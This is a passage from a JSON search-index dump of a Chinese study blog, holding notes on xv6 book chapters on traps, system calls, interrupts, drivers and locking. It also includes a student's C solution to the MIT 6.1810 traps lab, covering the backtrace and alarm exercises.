Locking","uri":"/posts/xv6_book_chapter_6/"},{"categories":["刷课笔记"],"content":"Instruction and memory ordering 我们会自然地认为程序按照源代码语句的出现顺序执行。这对于单线程代码来说是一个合理的认知，但在多个线程通过共享内存进行 交互时，这是不正确的。其中一个原因是编译器发出的store和load指令的顺序与源代码暗示的顺序不同，而且可能完全省略它们（例如通过将数据缓存在寄存器中）。另一个原因是为了提高性能，CPU 可能会乱序执行指令。例如，CPU 可能注意到在一系列串行指令中，指令 A 和 B 互不依赖。CPU 可能首先启动指令 B，要么是因为它的输入在指令 A 的输入之前就绪，要么是为了重叠执行 A 和 B。 作为可能出错的一个例子，在这个 push() 的代码中，如果编译器或 CPU 将对应于第 4 行的存储移动到第 6 行的 release() 之后，将是一场灾难： l = malloc(sizeof *l); l-\u003edata = data; acquire(\u0026listlock); l-\u003enext = list; list = l; release(\u0026listlock); 如果发生了这样的重新排序，将会出现一个窗口期，另一个 CPU 可能会获取锁并观察到更新后的列表，但看到一个未初始化的 list-\u003enext。 好消息是，编译器和 CPU 通过遵循一组称为内存模型的规则，并通过提供一些primitives来帮助程序员控制重新排序，从而帮助并发程序员。 为了告诉硬件和编译器不要重新排序，xv6 在 acquire()和 release()中都使用了 __sync_synchronize()。__sync_synchronize() 是一个内存block：它告诉编译器和 CPU 不要在block之间重新排序加载或存储。xv6 中 acquire() 和 release() 中的block在几乎所有关键情况下都强制执行顺序，因为 xv6 在访问共享数据时使用锁。第 9 章讨论了一些例外情况。 ","date":"2023-04-09","objectID":"/posts/xv6_book_chapter_6/:7:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Locking","uri":"/posts/xv6_book_chapter_6/"},{"categories":["刷课笔记"],"content":"Sleep locks 有时 xv6 需要长时间持有锁。例如，文件系统（第 8 章）在读写磁盘上的文件内容时会保持文件锁定，而这些磁盘操作可能需要数十毫秒。如果持有自旋锁这么长时间，如果另一个进程想要获取它，那么这个进程将会浪费很多时间在自旋上。自旋锁的另一个缺点是，进程在保持自旋锁的同时不能让出 CPU；我们希望能够：在持有锁的进程等待磁盘时，其他进程可以使用 CPU。在持有自旋锁的同时让出 CPU 是非法的，因为如果然后第二个线程尝试获取自旋锁，可能会导致死锁；由于 acquire() 不会让出 CPU，第二个线程的自旋可能会阻止第一个线程运行并释放锁。在持有锁的同时让出 CPU 也会违反持有自旋锁时必须关闭中断的要求。因此，我们希望一种在等待获取时可以让出 CPU，并允许在持有锁时进行让出（和中断）的锁类型。 由于 sleep-locks 保持中断启用，因此不能在中断处理程序中使用。由于 acquiresleep 可能会让出 CPU，因此在 spinlock 关键部分内部不能使用 sleep-locks（尽管可以在 sleep-lock 关键部分内部使用 spinlocks）。自旋锁最适用于短的关键部分，因为等待它们会浪费 CPU 时间；sleep-locks 对于较长时间的操作效果很好。 ","date":"2023-04-09","objectID":"/posts/xv6_book_chapter_6/:8:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Locking","uri":"/posts/xv6_book_chapter_6/"},{"categories":["刷课笔记"],"content":"Real world 尽管经过多年对并发 primitives 和并行性的研究，使用锁进行编程仍然具有挑战性。通常最好将锁隐藏在更高级别的抽象中，比如同步队列，尽管 xv6 并未这样做。如果你使用锁进行编程，明智的做法是使用一个试图识别竞争的工具，因为很容易忽略需要锁的不变式。 大多数操作系统支持 POSIX 线程（Pthreads），允许用户进程在不同的 CPU 上同时运行多个线程。Pthreads 支持用户级别的锁、block 等。Pthreads 还允许程序员可选地指定一个锁应该是可重入的。 在用户级支持 Pthreads 需要操作系统的支持。例如，如果一个 pthread 在系统调用中 block，同一进程的另一个 pthread 应该能够在该 CPU 上运行。另一个例子，如果一个 pthread 更改其进程的地址空间（例如，映射或解除映射内存），内核必须安排运行同一进程的其他 CPU 更新其硬件页表以反映地址空间的变化。 虽然可以在没有原子指令的情况下实现锁，但这是昂贵的，大多数操作系统使用原子指令。 如果许多 CPU 尝试在同一时间获取相同的锁，锁可能会变得昂贵。如果一个 CPU 在其本地缓存中缓存了一个锁，而另一个 CPU 必须获取该锁，那么用于更新包含锁的缓存行的原子指令必须将该行从一个 CPU 的缓存移动到另一个 CPU 的缓存，并可能使缓存行的任何其他副本无效。从另一个 CPU 的缓存中获取缓存行的代价可能比从本地缓存中获取缓存行的代价高几个数量级。 为了避免与锁相关的开销，许多操作系统使用无锁数据结构和算法。例如，可以实现一个类似本章开头的链表，它在搜索列表期间不需要锁，并且在列表中插入一个项只需要一个原子指令。然而，无锁编程比编程锁更复杂；例如，必须担心指令和内存重新排序。由于使用锁已经很困难，因此 xv6 避免了无锁编程带来的复杂性。 ","date":"2023-04-09","objectID":"/posts/xv6_book_chapter_6/:9:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Locking","uri":"/posts/xv6_book_chapter_6/"},{"categories":["刷课_Lab"],"content":"MIT 6.1810 中第四个 lab 的 solution","date":"2023-04-06","objectID":"/posts/mit_61810_lab4/","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Traps","uri":"/posts/mit_61810_lab4/"},{"categories":["刷课_Lab"],"content":"MIT 6.1810 中第四个 lab 的 solution Traps 第一个其实是关于RISC-V汇编的一个问答，不是这个Backtrace，但我简单看了一眼懒得做了（ ","date":"2023-04-06","objectID":"/posts/mit_61810_lab4/:0:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Traps","uri":"/posts/mit_61810_lab4/"},{"categories":["刷课_Lab"],"content":"Backtrace (moderate) For debugging it is often useful to have a backtrace: a list of the function calls on the stack above the point at which the error occurred. To help with backtraces, the compiler generates machine code that maintains a stack frame on the stack corresponding to each function in the current call chain. Each stack frame consists of the return address and a “frame pointer” to the caller’s stack frame. Register s0 contains a pointer to the current stack frame (it actually points to the the address of the saved return address on the stack plus 8). Your backtrace should use the frame pointers to walk up the stack and print the saved return address in each stack frame. 在kernel/printf.c中添加下面这个函数: void backtrace(void) { printf(\"backtrace:\\n\"); for(uint64 fp = r_fp(); fp \u003e PGROUNDDOWN(fp) ; fp = *(uint64*)(fp - 16)) printf(\"%p\\n\", *(uint64*)(fp - 8)); } ","date":"2023-04-06","objectID":"/posts/mit_61810_lab4/:1:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Traps","uri":"/posts/mit_61810_lab4/"},{"categories":["刷课_Lab"],"content":"Alarm (hard) In this exercise you’ll add a feature to xv6 that periodically alerts a process as it uses CPU time. This might be useful for compute-bound processes that want to limit how much CPU time they chew up, or for processes that want to compute but also want to take some periodic action. More generally, you’ll be implementing a primitive form of user-level interrupt/fault handlers; you could use something similar to handle page faults in the application, for example. Your solution is correct if it passes alarmtest and ‘usertests -q’ 添加系统调用的部分就不写了。 在kernel/sysproc.c文件中添加以下函数: int sys_sigalarm(void) { int ticks; uint64 handler_va; argint(0, \u0026ticks); argaddr(1, \u0026handler_va); struct proc* proc = myproc(); proc-\u003ealarm_interval = ticks; proc-\u003ehandler_va = handler_va; proc-\u003ehas_called = 0; return 0; } int sys_sigreturn(void) { struct proc* proc = myproc(); *proc-\u003etrapframe = proc-\u003esaved_trapframe; proc-\u003ehas_called = 0; return proc-\u003etrapframe-\u003ea0; } 在kernel/proc.h的proc结构体中添加以下内容: uint64 handler_va; int alarm_interval; int current_ticks; struct trapframe saved_trapframe; int has_called; 在kernel/proc.c中的allocproc()函数对新加入的变量进行初始化: p-\u003ehas_called = 0; p-\u003ecurrent_ticks = 0; p-\u003ealarm_interval = 0; p-\u003ehandler_va = 0; 在kernel/trap.c中修改usertrap()函数，下面是修改后的样子: // give up the CPU if this is a timer interrupt. if(which_dev == 2){ if (p-\u003ealarm_interval \u0026\u0026 !p-\u003ehas_called) { if (++p-\u003ecurrent_ticks == p-\u003ealarm_interval) { p-\u003esaved_trapframe = *p-\u003etrapframe; p-\u003etrapframe-\u003eepc = p-\u003ehandler_va; p-\u003ecurrent_ticks = 0; p-\u003ehas_called = 1; } } yield(); } 不过这样是无法通过usertests -q的测试的，不过能通过alarmtest这个测试，我本机测试是这样的。 后来发现了，需要把usertrap()的判断条件写全才行。 if (p-\u003ealarm_interval \u0026\u0026 !p-\u003ehas_called) { 改成 if (p-\u003ealarm_interval \u0026\u0026 !p-\u003ehas_called \u0026\u0026 p-\u003ehandler_va != 0) {","date":"2023-04-06","objectID":"/posts/mit_61810_lab4/:2:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Traps","uri":"/posts/mit_61810_lab4/"},{"categories":["刷课笔记"],"content":"Xv6 book 的第五章节","date":"2023-04-04","objectID":"/posts/xv6_book_chapter_5/","tags":["Xv6_RISC-V"],"title":"Xv6 book: Interrupts and device drivers","uri":"/posts/xv6_book_chapter_5/"},{"categories":["刷课笔记"],"content":"Xv6 book 的第五章节 Interrupts and device drivers 驱动是操作系统中管理特定设备的代码，它配置设备硬件，告诉设备执行操作，处理产生的中断，并与可能正在等待来自设备的 I/O 的进程交互。驱动程序代码可能很棘手，因为驱动程序与其管理的设备同时执行。此外，驱动程序必须了解设备的硬件接口，该接口可能很复杂且文档信息很少。 需要操作系统关注的设备通常可以配置为生成中断，这是一种 trap。 内核 trap 处理代码识别设备何时引发中断并调用驱动程序的中断处理程序； 在 xv6 中，此调度发生在 devintr() (kernel/trap.c)中。 许多设备驱动程序在两个 context 中执行代码：上半部分在进程的内核线程中运行，下半部分在中断时执行。上半部分通过系统调用（例如希望设备执行 I/O 的读写）。 该代码可能会要求硬件开始一项操作（例如，要求磁盘读取一个块）；然后代码等待操作完成。最终设备完成操作并引发中断。 驱动程序的中断处理程序充当下半部分，确定哪些操作已完成，在适当的情况下唤醒等待进程，并告诉硬件开始处理任何等待的下一个操作。 ","date":"2023-04-04","objectID":"/posts/xv6_book_chapter_5/:0:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Interrupts and device drivers","uri":"/posts/xv6_book_chapter_5/"},{"categories":["刷课笔记"],"content":"Code: Console input console 驱动程序(kernel/console.c)是驱动程序结构的简单说明。 console driver 通过连接到 RISC-V 的 UART 串行端口硬件接受人类输入的字符。console driver 一次累积一行输入，处理特殊输入字符，例如退格键和 Control-u。用户进程（例如 shell）使用 read() 系统调用从 console 获取输入行。当你在 QEMU 中向 xv6 输入时，你的击键将通过 QEMU的 模拟 UART 硬件传送到 xv6。 驱动程序与之通信的 UART 硬件是由 QEMU 模拟的 16550 芯片。在真实的计算机上，16550 将管理连接到终端或其他计算机的 RS232 串行链路。运行 QEMU 时，它会连接到您的键盘和显示器。 UART 硬件对于软件来说就像一组内存映射的控制寄存器。也就是说，RISC-V 硬件有一些物理地址连接到 UART 设备，以便加载和存储与设备硬件而不是RAM进行交互。UART 的内存映射地址从 0x10000000 或 UART0(kernel/memlayout.h) 开始。有几个 UART 控制寄存器，每个寄存器都有一个字节的宽度。它们与 UART0 的偏移量在 kernel/uart.c 中定义。例如，LSR 寄存器包含指示输入字符是否正在等待软件读取的bits。这些字符（如果有）可从 RHR 寄存器中读取。每次读取一个字符时，UART 硬件都会将其从等待字符的内部 FIFO 中删除，并在FIFO为空时清除 LSR 中的 “ready” bit。UART发 送硬件很大程度上独立于接收硬件； 如果软件向 THR 写入一个字节，则 UART 会传输该字节。 Xv6 的 main() 调用 consoleinit(kernel/console.c)来初始化 UART 硬件。此代码将 UART 配置为在 UART 接收每个输入字节时生成接收中断，并在每次 UART 完成发送一个输出字节时生成发送完成中断 (kernel/uart.c)。 Xv6 shell 通过 user/init.c 打开的文件描述符从 console 读取。对 read 系统调用的调用通过内核到达 consoleread()(kernel/console.c)。consoleread() 等待输入到达（通过中断）并缓冲在 cons.buf 中，将输入复制到用户空间，然后（在整行到达后）返回到用户进程。 如果用户还没有输入完整的行，任何读取进程都将在 sleep 调用中等待 (kernel/console.c)。 当用户键入字符时，UART 硬件会要求 RISC-V 引发中断，然后就到了 xv6 的 trap 处理程序。trap 处理程序调用 devintr()(kernel/trap.c)，它查看 RISC-V scause 寄存器以发现中断来自外部设备。然后它要求称为 PLIC 的硬件单元告诉它哪个设备中断了。如果是 UART，则 devintr() 调用 uartintr()。 uartintr()(kernel/uart.c)从 UART 硬件读取任何等待的输入字符并将它们交给 consoleintr()(kernel/console.c)；它不等待字符，因为将来的输入将引发新的中断。consoleintr() 的工作是在 cons.buf 中累积输入字符，直到整行到达。consoleintr() 特别对待退格键和其他一些字符。当换行符到达时，consoleintr() 会唤醒一个正在等待的 consoleread()（如果有的话）。 一旦被唤醒，consoleread() 将遍历 cons.buf 中的一整行，将其复制到用户空间，然后返回（通过系统调用机制）到用户空间。 ","date":"2023-04-04","objectID":"/posts/xv6_book_chapter_5/:1:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Interrupts and device drivers","uri":"/posts/xv6_book_chapter_5/"},{"categories":["刷课笔记"],"content":"Code: Console output 对连接到 console 的文件描述符的 write() 系统调用最终会调用 uartputc()(kernel/uart.c)。设备驱动程序维护一个输出缓冲区（uart_tx_buf），以便写入进程不必等待 UART 完成发送； 相反，uartputc() 将每个字符附加到缓冲区，调用 uartstart() 启动设备传输（如果尚未传输，然后返回。uartputc() 需要等待的唯一情况是缓冲区已满。 每次 UART 完成发送一个字节时，都会生成一个中断。uartintr() 调用 uartstart()，它检查设备是否确实已完成发送，并将下一个缓冲的输出字符交给设备。 因此，如果进程将多个字节写入 console，通常第一个字节将通过 uartputc() 对 uartstart() 的调用发送，其余缓冲字节将在传输完成中断到达时通过 uartintr() 的 uartstart() 调用发送。 ","date":"2023-04-04","objectID":"/posts/xv6_book_chapter_5/:2:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Interrupts and device drivers","uri":"/posts/xv6_book_chapter_5/"},{"categories":["刷课笔记"],"content":"Concurrency in drivers 您可能已经注意到 consoleread() 和 consoleintr() 中对 acquire() 的调用。这些调用获取锁，以保护 console 驱动程序的数据结构免受并发访问。这里存在三个并发带来的问题： 不同 CPU 上的两个进程可能同时调用 consoleread() 当 CPU 已经在 consoleread() 内执行时，硬件可能会要求 CPU 传递 console（实际上是 UART）中断 当 consoleread() 执行时，硬件可能会在不同的 CPU 上传递 console 中断。 这些危险可能会导致竞争或僵局。 驱动程序中需要注意并发的另一种方式是，一个进程可能正在等待来自设备的输入，但是当另一个进程（或根本没有进程）正在运行时，输入的中断信号到达可能会到达。因此，中断处理程序不允许在导致它们中断的进程或代码做一些考量。例如，中断处理程序无法安全地使用当前进程的页表调用 copyout()。中断处理程序通常执行相对较少的工作（例如，仅将输入数据复制到缓冲区），并唤醒上半部分代码来完成其余的工作。 ","date":"2023-04-04","objectID":"/posts/xv6_book_chapter_5/:3:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Interrupts and device drivers","uri":"/posts/xv6_book_chapter_5/"},{"categories":["刷课笔记"],"content":"Timer interrupts Xv6 使用时钟中断来维护其时钟并使其能够在计算密集型进程之间切换；usertrap() 和 kerneltrap() 中的 yield() 调用会导致这种切换。时钟中断来自连接到每个 RISC-V CPU 的时钟硬件。Xv6 对该时钟硬件进行编程，以定期中断每个CPU。 RISC-V 要求时钟中断在 machine 模式下进行，而不是在 supervisor 模式下进行。RISC-V machine 模式执行时无需分页，并具有一组单独的控制寄存器，因此在 machine 模式下运行普通 xv6 内核代码是不切实际的。 因此，xv6 完全独立于上面列出的 trap 机制来处理时钟中断。 在 main() 之前的 start.c 中以 machine 模式执行的代码设置为接收时钟中断 (kernel/start.c)。 部分工作是对 CLIINT 硬件（core-local interruptor）进行编程，使其在一定延迟后生成中断。另一部分是设置一个临时区域，类似于 trapframe，以帮助时钟中断处理程序保存寄存器和CLINT寄存器的地址。最后，start() 将 mtvec 设置为 timervec 并启用时钟中断。 时钟中断可以在用户或内核代码执行时的任何时刻发生；内核无法在关键操作期间禁用定时钟中断。 因此，时钟中断处理程序必须以保证不会干扰中断的内核代码的方式完成其工作。处理程序的基本策略是要求 RISC-V 引发 “software interrupt” 并立即返回。 RISC-V 通过普通的 trap 机制将软件中断传递给内核，并允许内核禁用它们。 处理时钟中断生成的软件中断的代码可以在 devintr()(kernel/trap.c) 中看到。 machine 模式时钟中断处理程序 timervec(kernel/kernelvec.S)。它在启动准备的暂存区域中保存一些寄存器，告诉 CLINT 何时生成下一个定时钟中断，要求 RISC-V 引发软件中断，恢复寄存器并返回。时钟中断处理程序中没有 C 代码。 ","date":"2023-04-04","objectID":"/posts/xv6_book_chapter_5/:4:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Interrupts and device drivers","uri":"/posts/xv6_book_chapter_5/"},{"categories":["刷课笔记"],"content":"Real world Xv6 允许在内核中执行以及执行用户程序时发生设备和时钟中断。 时钟中断强制从时钟中断处理程序进行线程切换（调用 yield()），即使在内核中执行时也是如此。如果内核线程有时花费大量时间进行计算而不返回用户空间，那么在内核线程之间公平地对CPU进行时间切片的能力非常有用。然而，内核代码需要注意它可能会被挂起（由于时钟中断）并稍后在不同的CPU上恢复，这是 xv6 中一些复杂性的根源。如果设备和时钟中断仅在执行用户代码时发生，则内核可以变得更简单。 支持典型计算机上的所有设备是一项艰巨的工作，因为有很多设备，这些设备有很多功能，并且设备和驱动程序之间的协议可能很复杂并且文档质量良莠不齐。在许多操作系统中，驱动程序所占的代码比核心内核还要多。 UART 驱动程序通过读取 UART 控制寄存器一次检索一个字节的数据； 这种模式称为 programmed I/O，因为软件驱动着数据的移动。programmed I/O 很简单，但速度太慢，无法在高数据速率下使用。需要高速移动大量数据的设备通常使用直接内存访问 (DMA)。DMA 设备硬件直接将传入数据写入 RAM，并从 RAM 读取传出数据。现代硬盘和网络设备使用 DMA。DMA 设备的驱动程序将在RAM中准备数据，然后使用对控制寄存器的单次写入来告诉设备处理准备好的数据。 当设备在不可预测的时间（但不是太频繁）需要关注时，中断就有意义。但中断的 CPU 开销很高。 因此，高速设备（例如网络和磁盘控制器）使用减少中断需求的技巧。一个技巧是为整批传入或传出请求引发一个中断。另一个技巧是驱动程序完全禁用中断，并定期检查设备以查看是否需要关注。这种技术称为轮询。如果设备执行操作速度非常快，则轮询是有意义的，但如果设备大部分时间处于空闲状态，则轮询会浪费 CPU 时间。某些驱动程序根据当前设备负载在轮询和中断之间动态切换。 UART 驱动程序首先将传入数据复制到内核中的缓冲区，然后复制到用户空间。这在低数据速率下是有意义的，但这样的双副本会显着降低快速生成或消耗数据的设备的性能。一些操作系统能够直接在用户空间缓冲区和设备硬件之间移动数据，通常使用 DMA。 正如第 1 章中提到的，console 对应用程序来说就像一个常规文件，应用程序使用 read() 和 write() 系统调用来进行读写。应用程序可能想要控制无法通过标准文件系统调用表达的设备方面（例如，在 console 驱动程序中启用/禁用行缓冲）。Unix 操作系统支持这种情况下的 ioctl 系统调用。 计算机的某些用途要求系统必须在有限的时间内做出响应。例如，在安全关键系统中，错过最后期限可能会导致灾难。Xv6 不适合 hard real-time，那样的操作系统往往是实现成与应用程序链接的库，其方式允许分析以确定最坏情况的响应时间。xv6 也不适合 soft real-time 应用程序，因为偶尔错过截止日期是可以接受的，而 xv6 的调度程序过于简单，并且存在长时间禁用中断的内核代码执行流。 ","date":"2023-04-04","objectID":"/posts/xv6_book_chapter_5/:5:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Interrupts and device drivers","uri":"/posts/xv6_book_chapter_5/"},{"categories":["刷课笔记"],"content":"Xv6 book 的第四章节","date":"2023-03-26","objectID":"/posts/xv6_book_chapter_4/","tags":["Xv6_RISC-V"],"title":"Xv6 book: Traps and system calls","uri":"/posts/xv6_book_chapter_4/"},{"categories":["刷课笔记"],"content":"Xv6 book 的第四章节 Traps and system calls 有三种情况可以让 CPU 放下普通的执行指令，强制将控制权转给处理该情况的特殊代码。一种情况是系统调用，用户程序执行 ecall 指令要求内核做一些事；另一种是指令执行了非法操作，比如除以 0 或者使用无效的虚拟地址。第三种情况是设备在发出需要的信号时的中断，例如硬盘完成了读写操作。 这里使用 trap 作为这些情况的通用术语。通常来讲，不管现在正在执行的代码是什么都会让 trap 先运行，然后自己再去执行，并且不知道 trap 做了什么。不知道这一点对设备中断尤其重要。通常情况是，trap 强制将控制权转移给内核，内核保存寄存器和其他状态以便于后续恢复，内核执行相应的处理代码，内核恢复刚刚保存的东西，代码得以继续执行。 Xv6 在内核处理中所有的 trap。内核中处理的 trap 通常用于系统调用。这对中断来说的好处在于隔离需要只有内核使用设备，并且内核可以让多个进程之间共享设备。对于异常来说的意义在于 xv6 可以杀死有问题的程序以响应用户空间的异常。 Xv6 的 trap 处理分为四步：RISC-V CPU 执行硬件操作，为内核中处理如何处理 trap 的 C 代码准备一些汇编指令。虽然三种 trap 之间的共性表明内核可以调用一个代码处理所有 trap，但是在以下三种不同的情况分开使用三种代码是很方便的： 来自用户空间的 trap、来自内核空间的 trap 和时钟中断。处理 trap 的内核代码通常被称为处理程序 (handler)，第一个处理程序通常用汇编而不是 C 来编写，有时称为 vector。 ","date":"2023-03-26","objectID":"/posts/xv6_book_chapter_4/:0:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Traps and system calls","uri":"/posts/xv6_book_chapter_4/"},{"categories":["刷课笔记"],"content":"RISC-V trap machinery 每个 RISC-V CPU 都有一组控制寄存器，内核写入寄存器告诉 CPU 如何处理 trap，内核读取寄存器寻找以及发生的 trap。RISC-V 文档包含完整的过程。kernel/riscv.h 包含 xv6 使用的定义。下边是最重要的寄存器的概述： stvec，内核在这里写入 trap 处理程序的地址，RISC-V 跳转到 stvec 的地址来处理 trap sepc，RISC-V 在遇到 trap 时将 pc 保存在这里（毕竟 pc 接下来就要被 stvec 覆盖了）。sert 在从 trap 返回时将 sepc 复制到 pc。内核可以编写 sepc 来控制 sert 的去向。 scause，一个用于描述 trap 原因的数字 sscrath，trap 处理程序使用 sscrath 防止保存用户寄存器前避免覆盖了用户寄存器。 sstatus，sstatus 的 SIE 位控制是否启用设备中断。如果内核 clear 了 SIE，RISC-V 将会推迟用户中断直到内核设置了 SIE。SPP 位指出了 trap 来自 user 模式还是 supervisor 模式，并控制 sret 返回的模式。 上述寄存器设计在 supervisor 模式下处理的 trap，它们不能在 user 模式下读写。对于 machine 模式的 trap，有一小组类似的控制寄存器，xv6 只在时钟中断的特殊情况才会使用它。 多核芯片的每个 CPU 都有自己的一组这样的寄存器，并且在任何时间内都有可能有多个 CPU 在处理 trap。 当需要强制设置 trap 时，RISC-V 硬件对所有的 trap 执行以下操作（时钟中断除外）： 如果 trap 是设备中断，并且 sstatus 的 SIE 被 clear 了就不会执行以下任何操作。 clear status 的 SIE 位以禁用中断 把 pc 复制给 spec 在 status 的 SPP 位保存当前的模式（user 还是 supervisor） 设置 scause 以处理导致该 trap 的原因 把模式设置成 supervisor stvec 复制给 pc 在 pc 指向的新地址开始执行 CPU 不会切换内核的页表，不会切换到内核的栈上，也不会保存除 PC 之外的任何寄存器。这都是内核软件的活。CPU 做这点活的原因之一就是让软件更加灵活，例如某些操作系统在特定情况下省略页表切换以提高 trap 的效率。 ","date":"2023-03-26","objectID":"/posts/xv6_book_chapter_4/:1:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Traps and system calls","uri":"/posts/xv6_book_chapter_4/"},{"categories":["刷课笔记"],"content":"来自于用户空间的 trap Xv6 处理 trap 的方式取决于这玩意是在内核中执行还是在用户代码中执行。下面是用户代码的 trap 的故事，在第五节描述了内核代码的 trap。 trap将会出现在正执行的用户程序在用户空间执行系统调用、非法操作或者设备中断的时候。来自用户空间的 trap 的高级路径是 uservec (kernel/trampoline.S: 21)，然后是 usertrap (kernel/trap.c: 37)；返回时是 usertrapret (kernel/trap.c: 90)，之后是 userret (kernel/trampoline.S: 101)。 设计 xv6 trap 处理的主要限制之一是 RISC-V 硬件强制执行 trap 时不会切换页表，也就是说 stvec 中的 trap 处理程序地址必须在用户页表中有一个有效的映射，这是 trap 处理程序的代码开始执行时生效的页表。xv6 的 trap 处理代码需要切换到内核页表，为了能够切换之后继续执行，内核页面必须具有 stvec 指向的处理程序的映射。 Xv6 使用 trampoline 页满足这些需求，trampoline 页包含 uservec，其指向 stvec。这个页在每个进程中的页表都会被映射，并且会被映射到 TRAMPOLINE 这个地址（该地址在进程虚拟地址的顶部）上。trampoline 页也被映射到内核页表的 TRAMPOLINE 地址。看下面这个图片，虽然 trampoline 页被映射到用户页表中，但是没有 PTE_U 这个 flag，所以只有 supervisor 模式才能执行代码。因为这个页也被映射在内核页表的相同的位置，所以切换到内核态的时候还可以接着执行该处理程序。 uservec 指向的 trap 处理程序在 trampoline.S (kernel/trampoline.S:21)。当 uservec 刚开始的时候，RISC-V CPU 这 32 个寄存器都需要被保存在内存的某个位置以便中断返回的时候恢复。存储寄存器值的内存位置同样需要被一个寄存器来存储，不过此时没有寄存器可以用来干这件事，RISC-V 提供 sscratch 寄存器可以改变这尴尬局面 —— csrw 指令可以在 uservec 首部保存 a0 寄存器到 sscratch 寄存器上。 uservec 接下来的任务就是保存那 32 个寄存器的值。内核为每一个进程都分配一个页用来保存 trapframe 结构体，这个结构体拥有可以保存这32个寄存器值的空间(kernel/proc.h:43)。因为 satp 仍然指向用户页表，所以 uservec 需要 trapframe 被映射到用户地址空间。xv6在每个进程虚拟地址 TRAPFRAME 映射进程的 trapframe。TRAPFRAME 在 TRAMPOLINE 之后。进程的 p-\u003etrapframe 也是指向 trapframe。因为记录的是它的物理地址，因此内核也可以在内核页表中使用它。 uservec 将 TRAPFRAME 加载到 a0 寄存器并把那 32 个寄存器的值保存到这里（包括用户的 a0，这是从 sscrath 寄存器读到的）。 trapframe 包含当前进程内核栈的地址，当前 CPU 的 hartid，usertrap 函数的地址以及内核页表的地址。uservec 可以检索这些值，将 stap 切换到内核页表并调用 usertrap。 usertrap 的工作是确定导致 trap 的原因再处理它，而后返回(kernel/trap.c:37)。它首先会改变 stvec 的值使 kernel 可以使用 kernelvec 而不是 uservec。它会保存 sepc 寄存器（以保存 pc 的值），因为 usertrap 也许会调用 yeild 去切换到其他进程的 kernel 线程，切换到的新进程可能会返回到用户态从而修改 spec 的值。如果这个 trap 是系统调用的话，usertrap 会调用 syscall 去处理它，如果是设备中断就调用 devintr，除此之外就是异常了，kernel 会杀掉这个出错的进程。系统调用执行过程中会把保存的 pc 加 4（即指向下一条指令），因为 RISC-V 中执行系统调用的时候，sepc 还是指向那条 ecall 指令，但是实际上应该被执行的用户代码是 ecall 的下一条。退出时 usertrap 会检查进程是否应该被 kill 或者应该让出 CPU（如果这个 trap 是时钟中断的话）。 返回到用户态的第一步是执行 usertrapret(kernel/trap.c:90)。这个函数会设置好 RISC-V 控制寄存器为未来来自用户态的 trap 做准备。这涉及到根据 uservec 改变 stvec 的值。准备 uservec 依赖的 trapframe 字段。并将 sepc 设置为之前保存的PC值。最后， usertrapret 会调用在 trampoline 页的 userret，这个页被同时映射在用户页表和内核页表，原因是 userret 中的汇编代码会切换页表。 usertrapret 函数在调用 userret 函数时,会通过 a0 寄存器传入指向进程用户页表的指针。userret 函数会将 satp 切换成进程的用户页表。需要记住，用户页表映射了 trampoline 页和 TRAPFRAME，但没有映射内核的其他内容。陷阱页在用户和内核页表中的相同虚拟地址映射，使 userret 函数在改变 satp 后继续执行。从此时起 userret 函数仅可以使用寄存器内容和 TRAPFRAME 内容。userret 函数会首先加载 TRAPFRAME 地址到 a0 寄存器，然后通过 a0 从 TRAPFRAME 中恢复已保存的用户模式寄存器值。之后恢复已保存的用户 a0 值，执行 sret 指令返回至用户模式。 ","date":"2023-03-26","objectID":"/posts/xv6_book_chapter_4/:2:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Traps and system calls","uri":"/posts/xv6_book_chapter_4/"},{"categories":["刷课笔记"],"content":"Code: Calling system calls 章节二结尾说了 initcode.S 调用了 exec 系统调用 (user/initcode.S:11)。接下来展示的是 user 的调用如何导致内核中 exec 的具体实现。 initcode.S 将 exec 的参数放到 a0 和 a1 寄存器中，并且把系统调用号存入 a7 寄存器。系统调用号会在 syscalls 数组（该数组是一个存着函数指针的表） (kernel/syscall.c:107)中匹配到一个入口。ecall 指令会导致切换到内核态然后再执行 uservec、usertrap，最后 syscall 被执行。 syscall (kernel/syscall.c:132)从保存在 trapframe 的 a7 寄存器检索出系统调用号并使其在 syscalls 检索出相应的处理函数。对于第一个系统调用来说，a7 包含的就是 SYS_exec (kernel/syscall.h:8)，其执行的结果就是调用系统调用的实现函数 sys_exec。 当 sys_exec 返回时，syscall 把返回值赋给 p-\u003etrapframe-\u003ea0，这会导致用户态下调用的那个 exec 会将其视作自己的返回值（因为 RISC-V 中，C 语言的调用规定就是 a0 寄存器保存返回值）。系统调用通常会在出错时返回负数，正常运行成功就返回非负数。如果系统调用号是无效的，syscall 会报错并且返回 -1。 ","date":"2023-03-26","objectID":"/posts/xv6_book_chapter_4/:3:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Traps and system calls","uri":"/posts/xv6_book_chapter_4/"},{"categories":["刷课笔记"],"content":"Code: System call arguments 内核中的系统调用需要用户代码传递来的参数，由于用户代码会调用系统调用的封装函数，所以那些参数会按照 RISC-V 调用约定那样位于那些寄存器中。 kernel 中存在三个函数（argint, argaddr, argfd）用于从 trap frame 拿到参数。它们都是调用了 argraw 并用自己的方式去保存参数。 一些系统调用的参数是指针，并且 kernel 必须使用这指针去对用户内存进行读写操作。例如 exec 这个系统调用会传递给 kernel 一个指向用户态中的字符数组的指针。这里存在两个问题。第一，用户程序可能有 bug 或者就是个恶意程序，可能会传给 kernel 一个非法的指针（比如让 kernel 访问内核内存而不是用户内存）。其次，xv6 内核页表映射与用户页表映射不同，因此 kernel 不能使用普通指令 load 或 store 用户提供的地址。 kernel中实现了一个函数可以将来自用户地址的数据安全的传递。fetchstr()(kernel/syscall.c:25)就是一个例子。文件系统的调用（例如 exec）会使用 fetchstr()（最终调用的是 copyinstr()）来完成这项工作。 copyinstr() 